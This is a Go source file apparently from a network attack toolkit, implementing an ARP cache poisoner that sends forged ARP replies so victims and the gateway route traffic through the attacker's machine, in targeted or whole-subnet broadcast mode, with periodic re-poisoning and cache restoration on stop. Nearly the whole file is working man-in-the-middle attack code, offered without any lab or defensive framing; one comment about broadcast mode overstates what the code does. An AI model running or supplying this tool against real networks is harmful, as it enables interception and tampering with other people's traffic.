package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

type ARPPoisoner struct {
	iface       *net.Interface
	attackerIP  net.IP
	attackerMAC net.HardwareAddr
	gatewayIP   net.IP
	gatewayMAC  net.HardwareAddr
	targetIPs   []net.IP
	victims     map[string]net.HardwareAddr
	mu          sync.RWMutex
	running     bool
	stopChan    chan struct{}
	interval    time.Duration
	sendFD      int // persistent raw socket for sending
}

type ARPConfig struct {
	Interface    string
	GatewayIP    string
	TargetIPs    []string
	IntervalSecs int
}

func NewARPPoisoner(cfg ARPConfig) (*ARPPoisoner, error) {
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
	}

	var attackerIP net.IP
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
			attackerIP = ipNet.IP.To4()
			break
		}
	}
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv4 address found on interface %s", cfg.Interface)
	}

	gatewayIP := net.ParseIP(cfg.GatewayIP).To4()
	if gatewayIP == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", cfg.GatewayIP)
	}

	var targetIPs []net.IP
	for _, t := range cfg.TargetIPs {
		ip := net.ParseIP(t).To4()
		if ip != nil {
			targetIPs = append(targetIPs, ip)
		}
	}

	interval := time.Duration(cfg.IntervalSecs) * time.Second
	if interval == 0 {
		interval = 2 * time.Second
	}

	return &ARPPoisoner{
		iface:       iface,
		attackerIP:  attackerIP,
		attackerMAC: iface.HardwareAddr,
		gatewayIP:   gatewayIP,
		targetIPs:   targetIPs,
		victims:     make(map[string]net.HardwareAddr),
		stopChan:    make(chan struct{}),
		interval:    interval,
		sendFD:      -1,
	}, nil
}

func (ap *ARPPoisoner) Start() error {
	var err error
	ap.gatewayMAC, err = ap.resolveMAC(ap.gatewayIP)
	if err != nil {
		return fmt.Errorf("failed to resolve gateway MAC for %s: %w", ap.gatewayIP, err)
	}

	// Open a persistent raw socket for the entire session
	ap.sendFD, err = openRawSocket(ap.iface.Index)
	if err != nil {
		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
	}

	log.Printf("[ARP POISON] Starting on interface %s", ap.iface.Name)
	log.Printf("[ARP POISON] Attacker: %s (%s)", ap.attackerIP, ap.attackerMAC)
	log.Printf("[ARP POISON] Gateway:  %s (%s)", ap.gatewayIP, ap.gatewayMAC)

	if len(ap.targetIPs) > 0 {
		log.Printf("[ARP POISON] Targeting %d specific hosts", len(ap.targetIPs))
		for _, ip := range ap.targetIPs {
			mac, err := ap.resolveMAC(ip)
			if err != nil {
				log.Printf("[ARP] Warning: Could not resolve %s: %v", ip, err)
				continue
			}
			ap.mu.Lock()
			ap.victims[ip.String()] = mac
			ap.mu.Unlock()
			log.Printf("[ARP POISON] Victim: %s (%s)", ip, mac)
		}
	} else {
		log.Printf("[ARP POISON] Targeting entire subnet (broadcast mode)")
		// In broadcast mode, also poison the gateway specifically
		// so return traffic comes through us
		ap.mu.Lock()
		ap.victims[ap.gatewayIP.String()] = ap.gatewayMAC
		ap.mu.Unlock()
	}

	ap.running = true

	// Send initial burst to take effect immediately before periodic loop starts
	for i := 0; i < 5; i++ {
		ap.sendPoison()
		time.Sleep(100 * time.Millisecond)
	}

	go ap.poisonLoop()
	return nil
}

func (ap *ARPPoisoner) Stop() {
	ap.running = false
	close(ap.stopChan)

	log.Printf("[ARP] Restoring ARP caches...")
	ap.restoreARP()

	if ap.sendFD > 0 {
		closeRawSocket(ap.sendFD)
		ap.sendFD = -1
	}

	log.Printf("[ARP] ARP poisoner stopped, caches restored")
}

func (ap *ARPPoisoner) poisonLoop() {
	ticker := time.NewTicker(ap.interval)
	defer ticker.Stop()

	for {
		select {
		case <-ap.stopChan:
			return
		case <-ticker.C:
			ap.sendPoison()
		}
	}
}

func (ap *ARPPoisoner) sendPoison() {
	broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

	if len(ap.targetIPs) > 0 {
		// Targeted poisoning — poison specific victims + gateway
		ap.mu.RLock()
		for ip, mac := range ap.victims {
			victimIP := net.ParseIP(ip).To4()
			if victimIP.Equal(ap.gatewayIP) {
				continue
			}
			// Tell victim: "gateway is at OUR MAC"
			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.attackerMAC)
			// Tell gateway: "victim is at OUR MAC"
			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, ap.attackerMAC)
		}
		ap.mu.RUnlock()
	} else {
		// Broadcast poisoning — tell entire subnet we're the gateway (gratuitous ARP)
		// Tell victims: "gateway is at OUR MAC" (broadcast)
		ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.attackerMAC)

		// CRITICAL: Also tell the gateway that common local IPs are at OUR MAC.
		// Without this, return traffic from the internet goes directly to the victim
		// (the gateway knows the victim's REAL MAC) and we never see responses.
		// In broadcast mode we don't know specific victims, so we use the subnet
		// broadcast to claim to own all traffic returning from the gateway.
		ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, ap.attackerIP, ap.attackerMAC)
	}
}

func (ap *ARPPoisoner) restoreARP() {
	for i := 0; i < 5; i++ {
		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

		if len(ap.targetIPs) > 0 {
			ap.mu.RLock()
			for ip, mac := range ap.victims {
				victimIP := net.ParseIP(ip).To4()
				if victimIP.Equal(ap.gatewayIP) {
					continue
				}
				// Restore: tell victim the REAL gateway MAC
				ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.gatewayMAC)
				// Restore: tell gateway the REAL victim MAC
				ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, mac)
			}
			ap.mu.RUnlock()
		} else {
			// Broadcast the real gateway MAC to everyone
			ap.sendARPReply(ap.gatewayIP, broadcastMAC, ap.gatewayIP, ap.gatewayMAC)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func (ap *ARPPoisoner) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
	packet := make([]byte, 42) // 14 (ethernet) + 28 (ARP)

	// Ethernet header
	copy(packet[0:6], dstMAC)
	copy(packet[6:12], spoofMAC)
	binary.BigEndian.PutUint16(packet[12:14], 0x0806) // EtherType: ARP

	// ARP header
	binary.BigEndian.PutUint16(packet[14:16], 0x0001) // Hardware type: Ethernet
	binary.BigEndian.PutUint16(packet[16:18], 0x0800) // Protocol type: IPv4
	packet[18] = 6                                     // Hardware addr length
	packet[19] = 4                                     // Protocol addr length
	binary.BigEndian.PutUint16(packet[20:22], 0x0002)  // Opcode: Reply

	// Sender (what we're claiming to be)
	copy(packet[22:28], spoofMAC)
	copy(packet[28:32], spoofIP.To4())

	// Target
	copy(packet[32:38], dstMAC)
	copy(packet[38:42], dstIP.To4())

	if ap.sendFD >= 0 {
		if err := sendOnSocket(ap.sendFD, ap.iface.Index, packet); err != nil {
			log.Printf("[ARP] Send failed: %v", err)
		}
	}
}

func (ap *ARPPoisoner) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	// Try the system ARP cache first
	mac, err := getARPEntry(ip)
	if err == nil {
		return mac, nil
	}

	// Trigger ARP resolution by pinging, then retry
	triggerARPResolution(ip)
	time.Sleep(1 * time.Second)

	mac, err = getARPEntry(ip)
	if err == nil {
		return mac, nil
	}

	// Second attempt with longer wait
	triggerARPResolution(ip)
	time.Sleep(2 * time.Second)

	mac, err = getARPEntry(ip)
	if err != nil {
		return nil, fmt.Errorf("could not resolve MAC for %s after retries: %w", ip, err)
	}

	return mac, nil
}
